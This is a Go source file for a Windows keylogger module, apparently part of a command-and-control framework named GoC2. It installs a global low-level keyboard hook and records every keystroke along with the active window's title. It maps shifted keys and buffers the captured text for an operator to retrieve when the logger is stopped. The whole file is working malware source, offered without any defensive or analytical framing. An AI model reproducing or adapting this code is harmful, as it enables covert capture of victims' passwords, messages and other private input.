//go:build windows
// +build windows

package keylogger

import (
	"errors"
	"fmt"
	"strings"
	"sync"
	"syscall"
	"unicode"
	"unsafe"

	"github.com/latortuga71/GoC2/pkg/winapi"
	"golang.org/x/sys/windows"
)

type KBDLLHOOKSTRUCT struct {
	vkCode      uint32
	scanCode    uint32
	flags       uint32
	time        uint32
	dwExtraInfo uintptr
}

var currentWindow string
var result *LockedString = &LockedString{Data: "\n"}
var idThread uint32 = 0
var stopHook bool = false
var globalHookHandle uintptr = 0

type LockedString struct {
	sync.Mutex
	Data string
}

func (l *LockedString) ClearBuffer() {
	l.Lock()
	l.Data = "\n"
	l.Unlock()
}

func (l *LockedString) PrintLockedString() string {
	l.Lock()
	tmp := l.Data
	l.Unlock()
	return tmp
}

func (l *LockedString) WriteToLockedString(data string) {
	l.Lock()
	l.Data += data
	l.Unlock()
}

func WindowsHookProc(code int, wParam uintptr, lParam uintptr) uintptr {
	winText := GetWindowText()
	if currentWindow != winText {
		currentWindow = winText
		result.WriteToLockedString("\n --- " + winText + " --- \n")
		//result +=
	}
	if code == winapi.HC_ACTION {
		if wParam == uintptr(winapi.WM_KEYDOWN) {
			winapi.PostThreadMessageW(idThread, uint32(winapi.WM_APP), wParam, lParam)
		}
	}
	return winapi.CallNextHookEx(0, code, wParam, lParam)
}

func GetWindowText() string {
	windowHandle := winapi.GetForegroundWindow()
	if windowHandle == 0 {
		return "Failed to get window title"
	}
	buffer := make([]byte, 1024)
	bufferLen := 1024
	success := winapi.GetWindowText(windowHandle, uintptr(unsafe.Pointer(&buffer[0])), bufferLen)
	if !success {
		return "Failed to get window title"
	}
	return string(buffer)
}

// not great but gets the job done.
func StartKeyLogger() error {
	stopHook = false
	pWindowsHookProc := syscall.NewCallback(WindowsHookProc)
	if pWindowsHookProc == 0 {
		return errors.New("Failed to create windows hook callback")
	}
	globalHookHandle = winapi.SetWindowsHookExW(winapi.WH_KEYBOARD_LL, pWindowsHookProc, 0, 0)
	if globalHookHandle == 0 {
		return errors.New("Failed to set windows hook ex.")
	}
	idThread = windows.GetCurrentThreadId()
	for {
		if stopHook {
			break
		}
		msg := &winapi.MSG{}
		gotMessage, _ := winapi.GetMessage(msg, 0, 0, 0)
		if !gotMessage {
			break
		}
		press := (*KBDLLHOOKSTRUCT)(unsafe.Pointer(msg.LParam))
		key := press.vkCode
		if key == 0 {
			continue
		}
		if key == 0x8 {
			result.WriteToLockedString("<backspace>\n")
			continue
		}
		keyState := make([]byte, 256)
		success := winapi.GetKeyboardState(uintptr(unsafe.Pointer(&keyState[0])))
		if !success {
			break
		}
		var keyChar uint32
		winapi.ToAscii(key, press.scanCode, uintptr(unsafe.Pointer(&keyState[0])), &keyChar, 0)
		//log.Println(fmt.Sprintf("%c", rune(keyChar)))
		if winapi.GetAsyncKeyState(VK_LSHIFT) || (winapi.GetAsyncKeyState(VK_RSHIFT)) {
			if unicode.IsLetter(rune(keyChar)) {
				result.WriteToLockedString(strings.ToUpper(fmt.Sprintf("%c", keyChar)))
			} else {
				switch rune(keyChar) {
				case '1':
					result.WriteToLockedString("!\n")
				case '2':
					result.WriteToLockedString("@\n")
				case '3':
					result.WriteToLockedString("#\n")
				case '4':
					result.WriteToLockedString("$\n")
				case '5':
					result.WriteToLockedString("%\n")
				case '6':
					result.WriteToLockedString("^\n")
				case '7':
					result.WriteToLockedString("&\n")
				case '8':
					result.WriteToLockedString("*\n")
				case '9':
					result.WriteToLockedString("(\n")
				case '0':
					result.WriteToLockedString(")\n")
				}
			}
		} else {
			result.WriteToLockedString(fmt.Sprintf("%c\n", keyChar))
		}
	}
	return nil
}

const (
	VK_LSHIFT = 0xA0
	VK_RSHIFT = 0xA1
)

func StopKeyLogger() (string, error) {
	stopHook = true
	winapi.UnhookWindowsHookEx(globalHookHandle)
	globalHookHandle = 0
	tmp := result.PrintLockedString()
	result.ClearBuffer()
	return tmp, nil
}
